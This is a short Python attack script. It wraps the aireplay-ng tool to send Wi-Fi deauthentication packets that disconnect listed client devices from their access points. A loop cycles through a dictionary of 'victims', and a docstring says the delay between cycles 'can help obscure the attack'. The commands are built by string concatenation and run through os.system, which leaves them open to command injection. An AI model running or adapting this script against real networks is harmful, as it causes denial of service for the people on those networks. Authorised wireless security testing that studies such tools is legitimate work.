import os
from datetime import datetime
import time
def de_auth_client( client_mac,
                    access_point_mac,
                    deauths=1,
                    adapter="wlan0mon"):

    """
    :param client_mac:
    :param access_point_mac:
    :param deauths: number of de-authentications (128 packets to router and client per deauth)
    :param adapter:
    :return:
    """
    r = os.system("aireplay-ng " + "-0 " + str(deauths) + " -a " + str(access_point_mac) \
              + " -c " + client_mac + " " + adapter)

    """
    # slow but better feedback
    import subprocess
    r2 = subprocess.call(["aireplay-ng", "-0", str(num_packets), "-a", str(access_point_mac),\
                          "-c", client_mac, adapter], stdout=subprocess.PIPE)

    stdout, stderr = r2.communicate()
    """
    return r

def attack_clients(clients_dict,
                   de_auths_per_client,
                   adapter,
                   timeout=60,
                   list_cycles=100,
                   time_between_cycles=1
                   ):
    """
    :param clients_dict: a dictionary of clients with (at least) client_mac, ap_mac. keys
    :param de_auths_per_client: (int) doesn't necessarily have to be large if
           cycling a list of clients is fast enough. Also note that 1 deauth = 128 packets
           Passing this option as zero makes it unlimited deauths
    :param adapter: If not wlan0mon pass name here
    :param timeout: how long is the attack
    :param list_cycles: how many iterations over the list of victims
    :param time_between_cycles: (int/float  in seconds) can help obscure the attack
    :return:  nothing

        IMPORTANT. List of clients are exist on a per-channel basis. So this function needs to be
        called for every ap's channel where there are targets.
    """
    CURR_TIME = datetime.now()
    TIME_DIFF = datetime.now() - CURR_TIME

    count = 0
    for client in clients_dict:
        if list_cycles <= count or timeout < TIME_DIFF.total_seconds() :
            break
        else:
            count += 1
            de_auth_client(client["client_mac"],
                           client["ap_mac"],
                           deauths=de_auths_per_client,
                           adapter=adapter)
            TIME_DIFF = datetime.now() - CURR_TIME
            if time_between_cycles > 0:
                time.sleep(time_between_cycles)

if __name__ == "__main__":
    pass
